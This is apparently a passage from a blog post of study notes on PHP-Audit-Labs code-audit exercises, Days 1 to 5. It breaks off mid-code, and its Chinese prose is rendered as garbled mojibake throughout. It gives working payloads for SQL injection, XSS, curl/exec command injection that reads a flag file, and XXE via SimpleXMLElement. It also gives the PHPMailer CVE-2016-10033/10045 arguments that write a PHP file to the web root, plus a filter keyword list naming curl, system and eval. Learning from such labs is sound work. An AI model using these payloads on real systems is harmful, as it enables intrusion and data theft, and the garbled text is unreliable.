å®¡è®¡åˆ°èƒ½çœ‹æ‡‚ä¸€ä¸ªå®Œæ•´çš„CMSå°±ç®—æœ‰ä¸€å®šåŠŸåº•äº†ã€‚æ‰€ä»¥å°±æŠŠphp-audit-labsçš„å…¨éƒ¨éƒ½è¿‡ä¸€éå§ã€‚</p><p>(æœ€è¿‘ä¹Ÿæ€»ç®—ç†Ÿç»ƒäº†ä¸€ä¸‹nodeè·Ÿpythonç›¸å…³çš„å¼€å‘å…¥é—¨ã€‚ç­‰ä¹‹åæ‰¾æ—¶é—´æŠŠjavaå…¥é—¨çŸ¥è¯†è¿‡ä¸€é,å†æŠŠECMAscript6çš„åŸºç¡€è¿‡ä¸€éå°±å·®ä¸å¤šäº†ï¼‰</p><a id="more"></a><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/1.png" class="lazyload" data-srcset="1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ä¸»è¦é—®é¢˜åœ¨äº<code>in_array()</code>å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚å¦‚æœæœªè®¾ç½®<code>in_array()</code>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºtrueåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ <code>7shell.php</code>ç»•è¿‡æ£€æŸ¥ã€‚å› ä¸º<code>7shell.php</code>è¢«è½¬æ¢ä¸º7.<br>åŒæ ·å‡ºç°åœ¨æŸcmsä¸­åˆ©ç”¨è¿™ç‚¹å¯ä»¥ç»•è¿‡è¿›è¡Œinsert_intoæ³¨å…¥<br><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/2.png" class="lazyload" data-srcset="2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å½“in_array()ç»•è¿‡åè½»æ¾è¾¾æˆæ³¨å…¥ã€‚<br><code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code></p><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>config.php</p><pre><code class="php">&lt;?php  $servername = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;root&quot;;$dbname = &quot;day1&quot;;function stop_hack($value){    $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;;    $back_list = explode(&quot;|&quot;,$pattern);    foreach($back_list as $hack){        if(preg_match(&quot;/$hack/i&quot;, $value))            die(&quot;$hack detected!&quot;);    }    return $value;}?&gt;</code></pre><p>index.php</p><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;;$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) {    die(&quot;è¿æ¥å¤±è´¥: &quot;);}$sql = &quot;SELECT COUNT(*) FROM users&quot;;$whitelist = array();$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0){    $row = $result-&gt;fetch_assoc();    $whitelist = range(1, $row[&#39;COUNT(*)&#39;]);}$id = stop_hack($_GET[&#39;id&#39;]);$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;if (!in_array($id, $whitelist)) {    die(&quot;id $id is not in whitelist.&quot;);}$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0){    $row = $result-&gt;fetch_assoc();    echo &quot;&lt;center&gt;&lt;table border=&#39;1&#39;&gt;&quot;;    foreach ($row as $key =&gt; $value) {        echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;;        echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;;    }    echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;;}else{    die($conn-&gt;error);}?&gt;</code></pre><p>è¿™é¢˜çš„<code>in_array()</code>å¹¶ä¸æ˜¯éš¾ç‚¹ã€‚å› ä¸ºåªè¦idå¼€å¤´ä¸ºæ•°å­—å°±èƒ½ç»•è¿‡äº†<br>ä¸»è¦é—®é¢˜åœ¨äºåé¢æ³¨å…¥ä¸Šã€‚<br>æ‰€å¹¸è¯­å¥ä¸­ä¼šçˆ†å‡ºsqlerror.åœ¨è¿‡æ»¤äº†è¿™äº›å…³é”®å­—çš„æƒ…å†µä¸‹ä»å¯ä»¥ä½¿ç”¨æŠ¥é”™å‡½æ•°,select,fromç­‰åŸºæœ¬å°±è¶³å¤Ÿå¾—åˆ°flagäº†ã€‚<br>ä¸è¿‡è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç»†èŠ‚,å°±æ˜¯updatexmlè¿™æ ·çš„æŠ¥é”™å‡½æ•°å¦‚æœè¯­å¥ä¸­ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ä¹Ÿå°±æ˜¯æˆ‘ä»¬åŸæ¥ç»å¸¸ä½¿ç”¨çš„0x7eä¹‹ç±»çš„å­—ç¬¦ï¼Œçˆ†å‡ºçš„ç»“æœå°†ä¼šå‡ºç°å­—ç¬¦ä¸¢å¤±çš„ç°è±¡ã€‚</p><p>æ‰€ä»¥æ‰¾æ›¿ä»£çš„å­—ç¬¦ä¸²è¿æ¥å‡½æ•°å³å¯.<code>make_set()</code></p><pre><code>?id=4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1))</code></pre><p>å…¶å®è‡ªå·±åŸæ¥åšsqlæ³¨å…¥çš„é¢˜ç›®ä¹Ÿæ›¾æœç´¢è¿‡ç›¸å…³çš„å†…å®¹ã€‚æ¯”å¦‚åœ¨concatè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ä¸ä½¿ç”¨<code>group_concat</code>å°†æ‰€æœ‰æŸ¥è¯¢ç»“æœéƒ½åˆ—å‡ºæ¥ã€‚å½“æ—¶å‘ç°<code>make_set()</code>æ˜¯èƒ½èµ·åˆ°concatä¸€æ ·çš„æ•ˆæœçš„ã€‚ä½†æ˜¯æ³¨æ„çš„æ˜¯,<code>make_set</code>è‡³å°‘æ¥æ”¶ä¸¤ä¸ªå‚æ•°,å› æ­¤å¿…é¡»ä½¿ç”¨é€—å·ã€‚<code>concat</code>ç±»åˆ™ä¸ç„¶ã€‚</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/3.png" class="lazyload" data-srcset="3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¢˜ç›®ä¸»è¦æ˜¯åœ¨ä¸¤å¤„å­˜åœ¨è¿‡æ»¤ã€‚é¦–å…ˆæ˜¯twigæ¨¡æ¿é‡Œå‡ºç°çš„linkè¢«escapeäº†</p><p>ç„¶åæ˜¯ä¸€ä¸ªfilter_var()å‡½æ•°<br>è¿™é‡Œescapeè¿‡æ»¤å™¨è°ƒç”¨çš„å®é™…ä¸Šæ˜¯<code>htmlspecialchars()</code>å‡½æ•°ã€‚ä½œç”¨è‡ªç„¶æ˜¯å°†å¸¸è§çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¸ºå®ä½“å­—ç¬¦ã€‚<br>è€Œ<code>filter_var()</code>åœ¨curlçš„ssrfä¸­å°±æ›¾è§è¿‡ã€‚ä¸»è¦æ£€æŸ¥ä¸€ä¸ªurlæ˜¯å¦åˆæ³•ã€‚<br>å› æ­¤ä»£ç é€»è¾‘ä¸»è¦æ˜¯ç»è¿‡è¿‡æ»¤åç”Ÿæˆä¸€ä¸ªaæ ‡ç­¾ã€‚<br>é‚£ä¹ˆå¯èƒ½å­˜åœ¨self-xss</p><p>å®˜æ–¹çš„payload<br><code>?nextSlide=javascript://commentï¼…250aalert(1)</code>è¾¾åˆ°å¼¹çª—çš„self-xss. ä½¿ç”¨javascriptä¼ªåè®®ç»•è¿‡<br>å·§å¦™çš„å°±æ˜¯åˆ©ç”¨filtervarçš„ç¼ºé™·è½»æ¾ä½¿ç”¨xxx://çš„å½¢å¼ç»•è¿‡æ£€æŸ¥ã€‚ç„¶åä¹Ÿå¯ä»¥è¿›è¡Œjsè¯­å¥çš„æ‰§è¡Œã€‚é‡è¦çš„ä¸€ç‚¹å°±æ˜¯//åœ¨jsä¸­æ˜¯æ³¨é‡Šç¬¦ã€‚å› æ­¤ä½¿ç”¨%250a(double urlencode %0a ä»¥ç»•è¿‡æµè§ˆå™¨è‡ªåŠ¨çš„è§£ç )å°†åé¢çš„å†…å®¹æ¢è¡Œåˆ°ä¸‹ä¸€è¡Œã€‚æˆåŠŸæ‰§è¡Œalert.</p><p>æŸcmsä¸­çš„åˆ©ç”¨æ˜¯,åœ¨è®¿é—®404é¡µé¢å­˜åœ¨è¿™æ ·çš„ä»£ç </p><pre><code class="php">&lt;code&gt;&lt;?php echo current_url(); ?&gt;&lt;/code&gt;</code></pre><p>current_url()æ–¹æ³•æ¥å—å®Œæ•´çš„404urlå‚æ•°ã€‚è¿”å›æœ€åä¸€ä¸ª/åçš„å†…å®¹æ‹¼æ¥è¿›codeä»£ç å—ã€‚å³å¯ä»¥æ’å…¥xssä»£ç <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>å¯¼è‡´äº†xss<br>payload<code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><h3 id="ç»ƒä¹ -1"><a href="#ç»ƒä¹ -1" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">// index.php&lt;?php $url = $_GET[&#39;url&#39;];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL)){    $site_info = parse_url($url);    if(preg_match(&#39;/sec-redclub.com$/&#39;,$site_info[&#39;host&#39;])){        exec(&#39;curl &quot;&#39;.$site_info[&#39;host&#39;].&#39;&quot;&#39;, $result);        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl {$site_info[&#39;host&#39;]} successfully!&lt;/h1&gt;&lt;/center&gt;              &lt;center&gt;&lt;textarea rows=&#39;20&#39; cols=&#39;90&#39;&gt;&quot;;        echo implode(&#39; &#39;, $result);    }    else{        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;);    }}else{    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;}?&gt;</code></pre><pre><code class="php">// f1agi3hEre.php&lt;?php  $flag = &quot;HRCTF{f1lt3r_var_1s_s0_c00l}&quot;?&gt;</code></pre><p>ä¸€ä¸ªæ˜æ˜¾çš„curlã€‚è€Œä¸”è¿˜æ˜¯ç»å…¸çš„å¯ç»•è¿‡çš„<code>filter_var()</code>+<code>parse_url()</code>+<code>exec()</code>æ‰§è¡Œcurlçš„é…ç½®ã€‚<br>é‚£ç°åœ¨å…³é”®æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚<br>æ¯”å¦‚æŠŠä¹‹å‰çš„å¯ç»•è¿‡<code>filter_var()</code>+<code>parse_url()</code>çš„payloadæ‹¿å‡ºæ¥</p><pre><code>demo://evil.com:80;sec-redclub.com:80/demo://evil.com:80,sec-redclub.com:80/</code></pre><p>è¿™é‡Œæƒ³è¦æ‰§è¡Œå‘½ä»¤è¯»å–æ–‡ä»¶ã€‚é‚£ä¹ˆæ°å¥½å¯ä»¥ç”¨åˆ°linuxä¸­ä½¿ç”¨åˆ†å·è¿›è¡Œå‘½ä»¤åˆ†å‰²çš„ä½œç”¨ã€‚<br><code>demo://%22;ls;%23;sec-redclub.com:80/</code><br>ç„¶åä¸ºäº†è¯»æ–‡ä»¶ä½¿ç”¨<code>&lt;</code>ä»£æ›¿ç©ºæ ¼<br><code>demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code></p><p>å•çº¯é’ˆå¯¹filter_varçš„è¯æŠŠä¸ƒæœˆç«å¸ˆå‚…çš„payloadæ”¾å‡ºæ¥</p><pre><code>http://localhost/index.php?url=http://demo.com@sec-redclub.comhttp://localhost/index.php?url=http://demo.com&amp;sec-redclub.comhttp://localhost/index.php?url=http://demo.com?sec-redclub.comhttp://localhost/index.php?url=http://demo.com/sec-redclub.comhttp://localhost/index.php?url=demo://demo.com,sec-redclub.comhttp://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/http://localhost/index.php?url=http://demo.com#sec-redclub.comPS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23</code></pre><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="class-exists-amp-amp-å†…éƒ¨ç±»xxe"><a href="#class-exists-amp-amp-å†…éƒ¨ç±»xxe" class="headerlink" title="class_exists()&amp;&amp;å†…éƒ¨ç±»xxe"></a>class_exists()&amp;&amp;å†…éƒ¨ç±»xxe</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/4.png" class="lazyload" data-srcset="4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸Šé¢çš„ä»£ç æœ‰ä¸€ä¸ªæ¯”è¾ƒè¿‡æ—¶çš„è·¯å¾„ç©¿è¶Šçš„æ–‡ä»¶åŒ…å«çš„æ´ã€‚<br>å³è°ƒç”¨<code>class_exists()</code>å‡½æ•°æ—¶ä¼šè‡ªåŠ¨åŠ è½½__autoload()ã€‚è¾¾æˆæ–‡ä»¶åŒ…å«ã€‚å¦‚æœæ˜¯ph5-5.3åˆ™å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šã€‚<br>è¿˜æœ‰ä¸€ä¸ªæ´æ¯”è¾ƒæœ‰æ„æ€ã€‚å®ä¾‹åŒ–ç±»çš„ç±»åå’Œä¼ å…¥ç±»çš„å‚æ•°å‡å¯æ§ã€‚æ­¤æ—¶å³ä½¿æ²¡æœ‰æ¶æ„ç±»æˆ‘ä»¬ä¹Ÿèƒ½ç”¨SimpleXMLElementæ„é€ xxeæ”»å‡»ã€‚è¿™ç‚¹æˆ‘åœ¨buuä¸Šåš<br>SUCTF 2018 Homeworkè¿™é¢˜æ—¶ä¹Ÿç”¨åˆ°äº†å®ƒè¾¾æˆxxeå¹¶è¿›ä¸€æ­¥ä½¿ç”¨xxeæ‰“ssrf</p><p>æŸcmsçš„åˆ©ç”¨æ˜¯ä¸€ä¸ªå¯æ§å˜é‡å¸¦æ¥çš„ååºåˆ—åŒ–XXE.å…·ä½“åˆ©ç”¨ä¸è°ˆã€‚ç®€å•è¯´ä¸‹gadgetæœ€åçš„åˆ©ç”¨ã€‚ç±»ä¸­å®ç°äº†ä¸€ä¸ªåå°„ç±»å®ä¾‹åŒ–ã€‚è€Œç±»åå¯æ§ã€‚ä¹‹åè¿åå°„ç±»çš„å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ã€‚å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„å®ä¾‹åŒ–SimpleXMLElementå¹¶æ„é€ xxepayloadè¿›è¡Œæ”»å‡»ã€‚<br>æ ¹æ®å®é™…æƒ…å†µæ„é€ payload<br><code>{&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:{&quot;direction&quot;:&quot;asc&quot;}}</code><br>è¿™é‡Œå‡ ä¸ªå‚æ•°å°¤å…¶æ˜¯2é‚£ä¸ªå°è±¡å¾ˆæ·±åˆ»,åŒæ—¶ä¹Ÿå¾ˆå¿…è¦ã€‚SUCTFé‚£é¢˜å°±æ˜¯å¦‚æ­¤<br><code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code></p><h3 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">// index.php&lt;?phpclass NotFound{    function __construct()    {        die(&#39;404&#39;);    }}spl_autoload_register(    function ($class){        new NotFound();    });$classname = isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;$param = isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;$param2 = isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;if(class_exists($classname)){    $newclass = new $classname($param,$param2);    var_dump($newclass);    foreach ($newclass as $key=&gt;$value)        echo $key.&#39;=&gt;&#39;.$value.&#39;&lt;br&gt;&#39;;}</code></pre><pre><code class="php">// f1agi3hEre.php&lt;?php$flag = &quot;HRCTF{X33_W1tH_S1mpl3Xml3l3m3nt}&quot;;?&gt;</code></pre><p>åˆ©ç”¨ç»è¿‡ä¸Šé¢çš„é“ºå«å°±å¾ˆç®€å•äº†ã€‚ç›´æ¥ç”¨å¯æ§çš„å‚æ•°è¿›è¡Œxxeå³å¯ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯,xxeéœ€è¦è¿›è¡Œphpæ–‡ä»¶æµæ¥è¿›è¡Œå†…å®¹è¯»å–ã€‚å› ä¸º<code>&lt; &gt; &amp; &#39; &quot;</code>ç­‰å­—ç¬¦ä¼šä½¿xmlè§£æå‡ºé”™ã€‚ä¸è¿‡ç”¨base64è¯»æ–‡ä»¶è¿™ç§è§£å†³åŠæ³•æƒ³å¿…æ—©å°±æ˜¯è½»è½¦ç†Ÿè·¯äº†å§ã€‚<br><code>?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</code></p><p>å‡å¦‚é¢˜ç›®ä¸çŸ¥é“flagçš„åå­—è¿˜å¯ä»¥ç”¨å¦å¤–çš„ç±»è¿›è¡Œæ–‡ä»¶åçš„è¯»å–ã€‚<br><code>?name=GlobIterator&amp;param=./*.php&amp;param2=0</code><br>ä½œç”¨ä¸globå·®ä¸å¤šã€‚</p><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="str-pos-é”™è¯¯ä½¿ç”¨"><a href="#str-pos-é”™è¯¯ä½¿ç”¨" class="headerlink" title="str_pos()é”™è¯¯ä½¿ç”¨"></a>str_pos()é”™è¯¯ä½¿ç”¨</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/5.png" class="lazyload" data-srcset="5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>phpè®¸å¤šå‡½æ•°å› ä¸ºå¼±ç±»å‹æˆ–é»‘é­”æ³•è¯ç”Ÿäº†å„ç§å„æ ·çš„æ¼æ´ã€‚str_pos()ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¸Šé¢çš„ä»£ç çœ‹ä¼¼ä¸¥æ ¼é™åˆ¶äº†å†…å®¹ä¸èƒ½å«æœ‰<code>&lt;</code>ä¸<code>&gt;</code>ã€‚ç„¶è€Œstr_posè¿”å›çš„å€¼å¯ä»¥æ˜¯0.<br>å³åŒ¹é…çš„å­—ç¬¦ä¸²é¦–ä¸ªå­—ç¬¦å°±æ˜¯<code>&lt;</code>ï¼Œ<code>&gt;</code>ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œ<code>ï¼strpos()</code>è¿”å›çš„å°±æ˜¯çœŸå€¼ã€‚æˆåŠŸç»•è¿‡ã€‚<br>payload:<br><code>&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code><br>åŒæ ·ç±»ä¼¼çš„æ¼æ´ä¹Ÿå¸¸è§äºpreg_match()è¿™æ ·çš„å‡½æ•°ã€‚å› ä¸ºå®ƒå¯èƒ½ä¼šå› ä¸ºä¼ å…¥æ•°ç»„æˆ–è€…æ­£åˆ™å›æº¯å¯¼è‡´è¿”å›falseå€¼ã€‚å¦‚æœå¼€å‘è€…æ‰€å†™çš„åˆ¤æ–­åªæ˜¯<code>!preg_match()</code>å°±å¾ˆå®¹æ˜“ç»•è¿‡äº†ã€‚</p><p>æŸCMSä¸­çš„é—®é¢˜ä¹Ÿæ˜¯å¼±ç±»å‹çš„é”…ã€‚ä½¿ç”¨è‹¥ç±»å‹ç›¸ç­‰åˆ¤æ–­æ—¶ï¼Œå‡å¦‚æ•°æ®åº“ä¸­å­˜å‚¨çš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆå½“nullä¸â€â€è¿›è¡Œå¼±ç±»å‹ç›¸ç­‰æ—¶å°†è¿”å›true.</p><pre><code class="php">null==&#39;&#39; //true&quot;0.0&quot;==&quot;0&quot; //true&quot;0.&quot;==&quot;0&quot; //true&quot;0e&quot;==&quot;0&quot; //true</code></pre><h3 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>è¿™æ˜¯æ”»é˜²ä¸–ç•Œä¸Šåšè¿‡çš„åŸé¢˜ã€‚åº”è¯¥æ˜¯lotteryè¿™ä¸ªæŠŠã€‚ç”¨åˆ°çš„æ˜¯jsonçš„å¼±ç±»å‹ã€‚jsonå¼±ç±»å‹åˆ¤ç›¸ç­‰æ—¶ï¼Œåªè¦ä¼ å…¥trueä¸éé›¶æ•°å­—ã€‚ç»“æœéƒ½å°†è¿”å›true</p><p>jsonå¼±ç±»å‹æ¯”è¾ƒå‡ºåçš„ä¸€ä¸ªæ¯”è¾ƒå°±æ˜¯æ•°å­—ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢</p><pre><code>0==&quot;0a....sds&quot;12==&quot;12fw...sd&quot;789==&quot;789asabxz&quot;</code></pre><p>å­—ç¬¦ä¸²ä¼šè¢«ç›´æ¥æˆªå–å‰é¢çš„çº¯æ•°å­—éƒ¨åˆ†è¿›è¡Œåˆ¤æ–­</p><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd-escapeshellarg"><a href="#escapeshellcmd-escapeshellarg" class="headerlink" title="escapeshellcmd()+escapeshellarg()"></a>escapeshellcmd()+escapeshellarg()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸»ä½“ä¸Šå°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº†åçš„mailå‡½æ•°æ‰§è¡Œã€‚<br>mailå‡½æ•°çš„å‚æ•°æ˜¯è¿™æ ·çš„</p><pre><code class="php">bool mail (    string $to ,    string $subject ,    string $message [,    string $additional_headers [,    string $additional_parameters ]])</code></pre><p>ç”±äºé»˜è®¤è°ƒç”¨çš„æ˜¯linuxçš„sendmailå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨<code>message</code>ä¸­å†™å…¥æ¶æ„ä»£ç ã€‚æ¥ç€ç”±additional_parameters æŒ‡å®šé¢å¤–å‚æ•°ï¼Œä»è€Œå†™å…¥åœ¨æŒ‡å®šç›®å½•å†™å…¥æ–‡ä»¶ã€‚</p><p>ä½†æ˜¯ï¼Œphpçš„mailå‡½æ•°ä¹Ÿåœ¨åº•å±‚é»˜è®¤æ‰§è¡Œäº†ä¸€å±‚<code>escapeshellcmd()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæ˜¾ç„¶è½¬ä¹‰äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚<br>ä¸è¿‡ï¼Œæœ¬é¢˜ä»£ç è¿˜æœ‰ä¸€å¤„ç»å…¸çš„<code>escapeshellarg()</code>ã€‚å¦‚æœ<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>æ­é…ä½¿ç”¨ï¼Œå°†å‡ºç°ç‰¹æ®Šå­—ç¬¦é€ƒé€¸çš„é—®é¢˜ã€‚<br>buuä¸Šä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®.è¿™é‡Œåˆ™å€Ÿç”¨é¡¹ç›®é‡Œçš„ä¾‹å­ç®€å•ä»‹ç»ä¸‹</p><pre><code class="bash">127.0.0.1&#39; -v -d a=1#escapeshellarg&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;#escapeshellcmd&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></pre><p>æ­¤æ—¶æœ€åä¸€æ­¥å¯ä»¥çœ‹å‡ºï¼Œ<code>\\</code>å°†è¢«è§£é‡Šä¸º<code>\</code>ä¸å†èµ·åˆ°è½¬ä¹‰çš„ä½œç”¨ï¼Œè€Œæ˜¯ä½œä¸ºæ¢è¡Œç¬¦ã€‚å› æ­¤payloadå˜ä¸ºå…ˆæ˜¯<code>127.0.0.1</code>ï¼Œå†<code>-v -d</code>-då¯¹åº”çš„æ•°æ®ä¸º<code>a=1&#39;</code>.</p><p>æ¯”å¦‚CVE-2016-10033 è·ŸCVE-2016-10045çš„ä¸¤ä¸ªpayload</p><pre><code>a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.coma&#39;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</code></pre><p>å‰è€…æ²¡æœ‰escapeshellcmdç›´æ¥æ‰“ã€‚åè€…escapeshellcmdååˆåŠ äº†ä¸€å±‚escapeshellargå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚</p><h3 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">//index.php&lt;?phphighlight_file(&#39;index.php&#39;);function waf($a){    foreach($a as $key =&gt; $value){        if(preg_match(&#39;/flag/i&#39;,$key)){            exit(&#39;are you a hacker&#39;);        }    }}foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) {    if($$__R) {         foreach($$__R as $__k =&gt; $__v) {             if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k);         }    }}if($_POST) { waf($_POST);}if($_GET) { waf($_GET); }if($_COOKIE) { waf($_COOKIE);}if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&#39;flag&#39;])){    if($_GET[&#39;flag&#39;] === $_GET[&#39;hongri&#39;]){        exit(&#39;error&#39;);    }    if(md5($_GET[&#39;flag&#39;] ) == md5($_GET[&#39;hongri&#39;])){        $url = $_GET[&#39;url&#39;];        $urlInfo = parse_url($url);        if(!(&quot;http&quot; === 